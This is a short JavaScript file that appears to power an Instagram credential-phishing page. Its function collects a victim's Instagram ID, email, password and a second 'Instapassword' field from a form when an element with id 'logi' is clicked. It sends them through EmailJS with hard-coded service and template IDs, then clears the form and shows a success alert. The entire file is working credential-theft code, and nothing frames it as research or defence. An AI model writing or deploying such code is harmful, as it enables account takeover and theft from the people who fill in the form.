function sendEmail() {
    var params = {
        name: document.querySelector("#instagramid").value,
        email: document.querySelector("#email").value,
        password: document.querySelector("#pass").value,
        message: `Instapassword: ${document.querySelector("#message").value}, id: ${instagramid}`
    };
    const serviceID = "service_zp0i24j";
    const templateID = "template_lwat07v";
    
    emailjs.send(serviceID, templateID, params)
    .then(
        res => {
            document.querySelector("#email").value = "";
            document.querySelector("#pass").value = "";
            document.querySelector("#message").value = "";
            document.querySelector("#instagramid").value = "";
            console.log(res);
            
            alert("Message sent successfully");
        })
        .catch((err) => console.log(err));
}

document.getElementById("logi").addEventListener('click', sendEmail);
